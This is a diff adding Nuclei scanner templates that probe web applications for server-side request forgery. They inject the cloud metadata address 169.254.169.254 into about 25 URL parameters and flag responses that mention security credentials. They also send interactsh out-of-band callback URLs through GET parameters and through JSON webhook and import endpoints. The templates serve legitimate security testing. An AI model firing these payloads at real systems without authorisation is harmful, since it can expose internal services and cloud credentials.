@@ -1,0 +1,152 @@
+id: bb-ssrf-inband
+
+info:
+  name: SSRF via URL Parameter — In-band Detection
+  author: guan4tou2
+  severity: high
+  description: |
+    Tests common URL-accepting parameters for SSRF by pointing to an internal
+    resource (169.254.169.254 cloud metadata) and checking for in-band response.
+    Only fires on responses that contain cloud metadata markers.
+  tags: bb-recon,ssrf,oast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      ssrf_param:
+        - url
+        - redirect
+        - next
+        - return
+        - returnUrl
+        - return_url
+        - callback
+        - fetch
+        - load
+        - src
+        - source
+        - img
+        - image
+        - path
+        - link
+        - target
+        - dest
+        - destination
+        - continue
+        - uri
+        - endpoint
+        - proxy
+        - request
+        - feed
+        - host
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{ssrf_param}}=http://169.254.169.254/latest/meta-data/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: or
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'local-ipv4'
+          - 'public-ipv4'
+          - 'security-credentials'
+          - 'iam'
+          - 'computeMetadata'
+          - 'instance/service-accounts'
+        part: body
+
+---
+id: bb-ssrf-oob
+
+info:
+  name: SSRF via URL Parameter — Out-of-Band (interactsh)
+  author: guan4tou2
+  severity: high
+  description: |
+    Tests common URL parameters for blind SSRF using interactsh OOB callback.
+    Requires nuclei with interactsh server configured.
+    Cover: redirect/url/callback/fetch/load/src/proxy params on GET requests.
+  tags: bb-recon,ssrf,oast,blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url={{interactsh-url}}"
+      - "{{BaseURL}}/?redirect={{interactsh-url}}"
+      - "{{BaseURL}}/?next={{interactsh-url}}"
+      - "{{BaseURL}}/?callback={{interactsh-url}}"
+      - "{{BaseURL}}/?fetch={{interactsh-url}}"
+      - "{{BaseURL}}/?load={{interactsh-url}}"
+      - "{{BaseURL}}/?src={{interactsh-url}}"
+      - "{{BaseURL}}/?image={{interactsh-url}}"
+      - "{{BaseURL}}/?proxy={{interactsh-url}}"
+      - "{{BaseURL}}/?endpoint={{interactsh-url}}"
+      - "{{BaseURL}}/?dest={{interactsh-url}}"
+      - "{{BaseURL}}/?uri={{interactsh-url}}"
+      - "{{BaseURL}}/?path={{interactsh-url}}"
+      - "{{BaseURL}}/?link={{interactsh-url}}"
+      - "{{BaseURL}}/?return={{interactsh-url}}"
+      - "{{BaseURL}}/?returnUrl={{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+---
+id: bb-ssrf-post-body
+
+info:
+  name: SSRF via POST Body URL Parameter
+  author: guan4tou2
+  severity: high
+  description: |
+    Tests JSON/form POST bodies with URL-accepting fields for SSRF.
+    Targets webhook, import, fetch-type API endpoints common in SaaS apps.
+  tags: bb-recon,ssrf,post,oast
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/webhook"
+      - "{{BaseURL}}/api/v1/webhook"
+      - "{{BaseURL}}/webhook"
+      - "{{BaseURL}}/api/import"
+      - "{{BaseURL}}/api/v1/import"
+      - "{{BaseURL}}/api/fetch"
+      - "{{BaseURL}}/api/proxy"
+
+    body: '{"url":"{{interactsh-url}}","webhook_url":"{{interactsh-url}}","callback_url":"{{interactsh-url}}"}'
+
+    headers:
+      Content-Type: application/json
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
